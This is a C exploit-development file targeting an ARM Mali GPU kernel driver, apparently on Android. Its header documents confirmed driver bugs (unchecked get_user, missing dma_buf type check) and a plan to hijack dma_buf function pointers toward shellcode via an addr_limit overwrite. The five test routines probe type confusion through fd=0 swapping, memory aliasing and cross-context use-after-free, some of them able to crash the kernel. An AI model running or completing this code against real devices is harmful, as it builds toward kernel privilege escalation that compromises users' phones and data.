/*
 * mali_exploit13.c — Write primitive via type confusion and GPU jobs
 *
 * CONFIRMED BUGS:
 * 1. Vendor import doesn't check get_user return → fd=0 fallback
 * 2. Vendor import doesn't check is_dma_buf → type confusion for non-dma_buf fd=0
 * 3. Type confusion crashes kernel (down() on garbage semaphore)
 *
 * EXPLOITATION STRATEGY:
 * The import code treats file->private_data as a dma_buf struct.
 * struct dma_buf has ops table at offset ~16 with function pointers.
 * If we control what's at private_data + offsets, we can:
 *   - Make down() succeed (provide valid semaphore)
 *   - Redirect ops->attach/map to shellcode
 *
 * But we can't directly control file->private_data for arbitrary files.
 * HOWEVER: we CAN use the addr_limit overwrite technique.
 *
 * Test 1: Find the exact dma_buf struct offsets by using mapped memory
 * Test 2: Try vendor JOB_SUBMIT with controlled job descriptor
 * Test 3: Try a pipe as fd=0 (pipe_inode_info has wait_queue)
 * Test 4: Use the type confusion with /dev/ion as fd=0
 * Test 5: Try creating aliased regions + free for UAF
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/ioctl.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

struct uk_header { uint32_t id; uint32_t ret; };

static unsigned int make_cmd_std(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 'M', 0, sz);
}
static unsigned int make_cmd_vendor(uint32_t sz) {
    return _IOC(_IOC_READ | _IOC_WRITE, 0x80, 0, sz);
}

static int mali_open_ctx(void) {
    int fd = open("/dev/mali0", O_RDWR | O_CLOEXEC);
    if (fd < 0) return -1;
    uint8_t hb[16]; memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 0; hb[8] = 10;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    memset(hb, 0, 16);
    ((struct uk_header*)hb)->id = 530;
    if (ioctl(fd, make_cmd_std(16), hb) < 0) { close(fd); return -1; }
    return fd;
}

static int ion_alloc_dmabuf(void) {
    int ion_fd = open("/dev/ion", O_RDONLY);
    if (ion_fd < 0) return -1;
    struct { uint32_t len, align, heap_mask, flags; int32_t handle; }
        alloc_s = {4096, 4096, 1, 0, 0};
    if (ioctl(ion_fd, 0xc0144900, &alloc_s) < 0) { close(ion_fd); return -1; }
    struct { int32_t handle, fd; } share_s = {alloc_s.handle, 0};
    if (ioctl(ion_fd, 0xc0084904, &share_s) < 0) { close(ion_fd); return -1; }
    return share_s.fd;
}

/* ============================================================= */
/* TEST 1: Vendor JOB_SUBMIT — can we submit GPU jobs?            */
/* func=529, job chain descriptor in user memory                  */
/* ============================================================= */
static void test1(void) {
    fprintf(stderr, "\n=== TEST 1: Vendor JOB_SUBMIT ===\n");

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) return;

    /* First, import a buffer to have a valid GPU region */
    int dma_fd = ion_alloc_dmabuf();
    int saved = dup(0);
    dup2(dma_fd, 0);

    /* Import buffer */
    uint8_t ibuf[48]; memset(ibuf, 0, 48);
    ((struct uk_header*)ibuf)->id = 513;
    *(uint64_t*)(ibuf + 8) = (uint64_t)(uintptr_t)&dma_fd;
    *(uint32_t*)(ibuf + 16) = 2;
    *(uint64_t*)(ibuf + 24) = 0xF;
    ioctl(mali_fd, make_cmd_vendor(48), ibuf);
    uint64_t gpu_va = *(uint64_t*)(ibuf + 32);
    fprintf(stderr, "  Import: result=%u gpu_va=0x%llx\n",
            ((struct uk_header*)ibuf)->id, (unsigned long long)gpu_va);

    /* Create a job atom structure in user memory */
    /* struct base_jd_atom_v2 on r7p0:
     * u64 jc;             // [0] job chain GPU VA
     * uintptr_t data[2];  // [8, 12] user data
     * u64 ext_res;        // [16] external resource list
     * u16 nr_ext_res;     // [24]
     * ... etc
     * Total size ~48-64 bytes per atom
     */
    uint8_t atom[64];
    memset(atom, 0, 64);
    *(uint64_t*)(atom + 0) = 0;  /* jc = 0 (no actual job chain) */
    *(uint32_t*)(atom + 16) = 0; /* no ext resources */

    /* JOB_SUBMIT struct:
     * uk_header  [0-7]
     * u64 addr   [8-15]  pointer to atom array
     * u32 nr_atoms [16-19]
     * u32 stride   [20-23]
     */

    /* Try nr_atoms=0 first (should be safe no-op) */
    uint8_t jbuf[48]; memset(jbuf, 0, 48);
    ((struct uk_header*)jbuf)->id = 529;
    *(uint64_t*)(jbuf + 8) = (uint64_t)(uintptr_t)atom;
    *(uint32_t*)(jbuf + 16) = 0;   /* nr_atoms = 0 */
    *(uint32_t*)(jbuf + 20) = 64;  /* stride = 64 */
    int r = ioctl(mali_fd, make_cmd_vendor(48), jbuf);
    fprintf(stderr, "  JOB_SUBMIT(0 atoms) vendor: ioctl=%d result=%u\n",
            r, ((struct uk_header*)jbuf)->id);

    /* Try via standard dispatch too */
    memset(jbuf, 0, 48);
    ((struct uk_header*)jbuf)->id = 529;
    *(uint64_t*)(jbuf + 8) = (uint64_t)(uintptr_t)atom;
    *(uint32_t*)(jbuf + 16) = 0;
    *(uint32_t*)(jbuf + 20) = 64;
    r = ioctl(mali_fd, make_cmd_std(48), jbuf);
    fprintf(stderr, "  JOB_SUBMIT(0 atoms) std: ioctl=%d result=%u\n",
            r, ((struct uk_header*)jbuf)->id);

    /* Try with 1 atom but jc=0 */
    memset(jbuf, 0, 48);
    ((struct uk_header*)jbuf)->id = 529;
    *(uint64_t*)(jbuf + 8) = (uint64_t)(uintptr_t)atom;
    *(uint32_t*)(jbuf + 16) = 1;
    *(uint32_t*)(jbuf + 20) = 64;
    r = ioctl(mali_fd, make_cmd_vendor(48), jbuf);
    fprintf(stderr, "  JOB_SUBMIT(1 atom, jc=0) vendor: ioctl=%d result=%u\n",
            r, ((struct uk_header*)jbuf)->id);

    dup2(saved, 0); close(saved);

    /* Free imported region */
    uint8_t fb[16]; memset(fb, 0, 16);
    ((struct uk_header*)fb)->id = 516;
    *(uint64_t*)(fb + 8) = gpu_va;
    ioctl(mali_fd, make_cmd_vendor(16), fb);

    close(dma_fd); close(mali_fd);
}

/* ============================================================= */
/* TEST 2: Memory alias — create alias to existing region         */
/* If we can alias a freed region, we get a dangling alias        */
/* ============================================================= */
static void test2(void) {
    fprintf(stderr, "\n=== TEST 2: Memory operations on imported region ===\n");

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) return;
    int dma_fd = ion_alloc_dmabuf();

    /* Import */
    uint64_t gpu_va;
    uint8_t buf[56]; memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = (uint64_t)(uintptr_t)&dma_fd;
    *(uint32_t*)(buf + 16) = 2;
    *(uint64_t*)(buf + 24) = 0xF;
    ioctl(mali_fd, make_cmd_vendor(48), buf);
    gpu_va = *(uint64_t*)(buf + 32);
    fprintf(stderr, "  Import: gpu_va=0x%llx\n", (unsigned long long)gpu_va);

    if (!gpu_va) goto done;

    /* Try MEM_ALIAS (518) — creates an alias to existing region */
    memset(buf, 0, 56);
    ((struct uk_header*)buf)->id = 518;
    *(uint64_t*)(buf + 8) = 0xF;     /* flags */
    *(uint64_t*)(buf + 16) = 1;      /* nents */
    /* The alias info is in a sub-struct:
     * ai[0].handle = gpu_va
     * ai[0].offset = 0
     * ai[0].length = 1 page
     */
    *(uint64_t*)(buf + 24) = gpu_va;  /* handle */
    *(uint64_t*)(buf + 32) = 0;       /* offset */
    *(uint64_t*)(buf + 40) = 1;       /* length */
    int r = ioctl(mali_fd, make_cmd_vendor(56), buf);
    fprintf(stderr, "  MEM_ALIAS vendor(56): result=%u\n",
            ((struct uk_header*)buf)->id);

    r = ioctl(mali_fd, make_cmd_std(56), buf);
    fprintf(stderr, "  MEM_ALIAS std(56): result=%u\n",
            ((struct uk_header*)buf)->id);

    /* Try different sizes for MEM_ALIAS */
    for (int sz = 16; sz <= 80; sz += 8) {
        memset(buf, 0, 56);
        ((struct uk_header*)buf)->id = 518;
        *(uint64_t*)(buf + 8) = 0xF;
        r = ioctl(mali_fd, make_cmd_vendor(sz), buf);
        if (r == 0)
            fprintf(stderr, "  MEM_ALIAS vendor(sz=%d): result=%u\n",
                    sz, ((struct uk_header*)buf)->id);
    }

done:
    /* Free */
    uint8_t fb[16]; memset(fb, 0, 16);
    ((struct uk_header*)fb)->id = 516;
    *(uint64_t*)(fb + 8) = gpu_va;
    ioctl(mali_fd, make_cmd_vendor(16), fb);

    close(dma_fd); close(mali_fd);
}

/* ============================================================= */
/* TEST 3: Explore the type confusion crash mechanism              */
/* Open fd=0 as different file types and observe behavior          */
/* Only test types that WON'T cause kernel panic                   */
/* ============================================================= */
static void test3(void) {
    fprintf(stderr, "\n=== TEST 3: Type confusion exploration ===\n");

    int mali_fd = mali_open_ctx();
    if (mali_fd < 0) return;

    /* First: with fd=0 = dma_buf (should succeed, baseline) */
    int dma_fd = ion_alloc_dmabuf();
    int saved = dup(0);
    dup2(dma_fd, 0);

    uint8_t buf[48]; memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint32_t*)(buf + 8) = 0xBF000001;
    *(uint32_t*)(buf + 16) = 2;
    *(uint64_t*)(buf + 24) = 0xF;
    ioctl(mali_fd, make_cmd_vendor(48), buf);
    fprintf(stderr, "  fd0=dma_buf: result=%u (0=success)\n",
            ((struct uk_header*)buf)->id);

    /* With fd=0 = ANOTHER mali device file */
    int mali2 = open("/dev/mali0", O_RDWR);
    if (mali2 >= 0) {
        dup2(mali2, 0);
        memset(buf, 0, 48);
        ((struct uk_header*)buf)->id = 513;
        *(uint32_t*)(buf + 8) = 0xBF000001;
        *(uint32_t*)(buf + 16) = 2;
        *(uint64_t*)(buf + 24) = 0xF;

        /* THIS IS DANGEROUS - mali file->private_data might crash */
        /* Do it in a child with alarm */
        pid_t p = fork();
        if (p == 0) {
            alarm(3);
            ioctl(mali_fd, make_cmd_vendor(48), buf);
            fprintf(stderr, "  fd0=mali: result=%u\n",
                    ((struct uk_header*)buf)->id);
            _exit(0);
        }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st))
            fprintf(stderr, "  fd0=mali: SIGNAL %d (kernel may have panicked!)\n",
                    WTERMSIG(st));
        close(mali2);
    }

    /* With fd=0 = /dev/ion */
    int ion2 = open("/dev/ion", O_RDONLY);
    if (ion2 >= 0) {
        dup2(ion2, 0);
        memset(buf, 0, 48);
        ((struct uk_header*)buf)->id = 513;
        *(uint32_t*)(buf + 8) = 0xBF000001;
        *(uint32_t*)(buf + 16) = 2;
        *(uint64_t*)(buf + 24) = 0xF;

        pid_t p = fork();
        if (p == 0) {
            alarm(3);
            ioctl(mali_fd, make_cmd_vendor(48), buf);
            fprintf(stderr, "  fd0=ion: result=%u\n",
                    ((struct uk_header*)buf)->id);
            _exit(0);
        }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st))
            fprintf(stderr, "  fd0=ion: SIGNAL %d\n", WTERMSIG(st));
        close(ion2);
    }

    /* With fd=0 = socket pair */
    int sv[2];
    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sv) == 0) {
        dup2(sv[0], 0);
        memset(buf, 0, 48);
        ((struct uk_header*)buf)->id = 513;
        *(uint32_t*)(buf + 8) = 0xBF000001;
        *(uint32_t*)(buf + 16) = 2;
        *(uint64_t*)(buf + 24) = 0xF;

        pid_t p = fork();
        if (p == 0) {
            alarm(3);
            ioctl(mali_fd, make_cmd_vendor(48), buf);
            fprintf(stderr, "  fd0=socket: result=%u\n",
                    ((struct uk_header*)buf)->id);
            _exit(0);
        }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st))
            fprintf(stderr, "  fd0=socket: SIGNAL %d\n", WTERMSIG(st));
        close(sv[0]); close(sv[1]);
    }

    dup2(saved, 0); close(saved);
    close(dma_fd); close(mali_fd);
}

/* ============================================================= */
/* TEST 4: Use the STANDARD import to find dma_buf struct offsets  */
/* Do standard import, then read the dma_buf file's f_op via /proc */
/* ============================================================= */
static void test4(void) {
    fprintf(stderr, "\n=== TEST 4: dma_buf struct analysis ===\n");

    int dma_fd = ion_alloc_dmabuf();
    if (dma_fd < 0) return;

    /* Read /proc/self/fdinfo for the dma_buf fd */
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", dma_fd);
    char target[256];
    int len = readlink(path, target, sizeof(target)-1);
    if (len > 0) {
        target[len] = 0;
        fprintf(stderr, "  dma_fd=%d -> %s\n", dma_fd, target);
    }

    snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", dma_fd);
    int info_fd = open(path, O_RDONLY);
    if (info_fd >= 0) {
        char infobuf[1024]; memset(infobuf, 0, 1024);
        read(info_fd, infobuf, 1023);
        fprintf(stderr, "  fdinfo:\n%s", infobuf);
        close(info_fd);
    }

    /* Map the dma_buf */
    void *dm = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, dma_fd, 0);
    if (dm != MAP_FAILED) {
        fprintf(stderr, "  dma_buf mmap: %p\n", dm);

        /* Write a known pattern */
        memset(dm, 0xAA, 4096);

        /* Check /proc/self/maps for this mapping */
        char line[256];
        FILE *maps = fopen("/proc/self/maps", "r");
        while (fgets(line, sizeof(line), maps)) {
            if (strstr(line, "dmabuf") || strstr(line, "ion") ||
                strstr(line, "b6f"))
                fprintf(stderr, "  %s", line);
        }
        fclose(maps);

        munmap(dm, 4096);
    }

    close(dma_fd);
}

/* ============================================================= */
/* TEST 5: Import from SECOND Mali context                        */
/* What if we vendor-import a dma_buf on ctx2 that was freed on ctx1? */
/* ============================================================= */
static void test5(void) {
    fprintf(stderr, "\n=== TEST 5: Cross-context import after free ===\n");

    int mali1 = mali_open_ctx();
    int mali2 = mali_open_ctx();
    if (mali1 < 0 || mali2 < 0) return;
    fprintf(stderr, "  mali1=%d, mali2=%d\n", mali1, mali2);

    int dma_fd = ion_alloc_dmabuf();

    /* Import on ctx1 */
    uint64_t va1;
    uint8_t buf[48]; memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = (uint64_t)(uintptr_t)&dma_fd;
    *(uint32_t*)(buf + 16) = 2;
    *(uint64_t*)(buf + 24) = 0xF;
    ioctl(mali1, make_cmd_vendor(48), buf);
    va1 = *(uint64_t*)(buf + 32);
    fprintf(stderr, "  ctx1 import: result=%u va=0x%llx\n",
            ((struct uk_header*)buf)->id, (unsigned long long)va1);

    /* Import on ctx2 */
    uint64_t va2;
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 513;
    *(uint64_t*)(buf + 8) = (uint64_t)(uintptr_t)&dma_fd;
    *(uint32_t*)(buf + 16) = 2;
    *(uint64_t*)(buf + 24) = 0xF;
    ioctl(mali2, make_cmd_vendor(48), buf);
    va2 = *(uint64_t*)(buf + 32);
    fprintf(stderr, "  ctx2 import: result=%u va=0x%llx\n",
            ((struct uk_header*)buf)->id, (unsigned long long)va2);

    /* Free on ctx1 */
    uint8_t fb[16]; memset(fb, 0, 16);
    ((struct uk_header*)fb)->id = 516;
    *(uint64_t*)(fb + 8) = va1;
    ioctl(mali1, make_cmd_vendor(16), fb);
    fprintf(stderr, "  ctx1 free: result=%u\n", ((struct uk_header*)fb)->id);

    /* Close ctx1 — forces cleanup */
    close(mali1);
    fprintf(stderr, "  Closed ctx1\n");

    /* Close dma_buf fd — ctx2 should still hold a ref */
    close(dma_fd);
    fprintf(stderr, "  Closed dma_buf fd\n");

    /* Try to use region on ctx2 */
    memset(buf, 0, 48);
    ((struct uk_header*)buf)->id = 515;  /* MEM_QUERY */
    *(uint64_t*)(buf + 8) = va2;
    ioctl(mali2, make_cmd_vendor(48), buf);
    fprintf(stderr, "  ctx2 query: result=%u\n", ((struct uk_header*)buf)->id);

    /* Free on ctx2 */
    memset(fb, 0, 16);
    ((struct uk_header*)fb)->id = 516;
    *(uint64_t*)(fb + 8) = va2;
    ioctl(mali2, make_cmd_vendor(16), fb);
    fprintf(stderr, "  ctx2 free: result=%u\n", ((struct uk_header*)fb)->id);

    close(mali2);
}

int main(int argc, char **argv) {
    fprintf(stderr, "=== Mali Write Primitive Exploitation ===\n");
    fprintf(stderr, "PID=%d UID=%d\n", getpid(), getuid());

    int test = 0;
    if (argc >= 2) test = atoi(argv[1]);

    if (test == 1 || test == 0) {
        pid_t p = fork(); if (!p) { alarm(15); test1(); _exit(0); }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st)) fprintf(stderr, "  CRASH: sig %d\n", WTERMSIG(st));
    }
    if (test == 2 || test == 0) {
        pid_t p = fork(); if (!p) { alarm(10); test2(); _exit(0); }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st)) fprintf(stderr, "  CRASH: sig %d\n", WTERMSIG(st));
    }
    /* TEST 3 IS DANGEROUS — type confusion tests may crash kernel */
    if (test == 3) {
        pid_t p = fork(); if (!p) { alarm(15); test3(); _exit(0); }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st)) fprintf(stderr, "  CRASH: sig %d\n", WTERMSIG(st));
    }
    if (test == 4 || test == 0) {
        pid_t p = fork(); if (!p) { alarm(10); test4(); _exit(0); }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st)) fprintf(stderr, "  CRASH: sig %d\n", WTERMSIG(st));
    }
    if (test == 5 || test == 0) {
        pid_t p = fork(); if (!p) { alarm(10); test5(); _exit(0); }
        int st; waitpid(p, &st, 0);
        if (WIFSIGNALED(st)) fprintf(stderr, "  CRASH: sig %d\n", WTERMSIG(st));
    }

    fprintf(stderr, "\n=== Done ===\n");
    return 0;
}
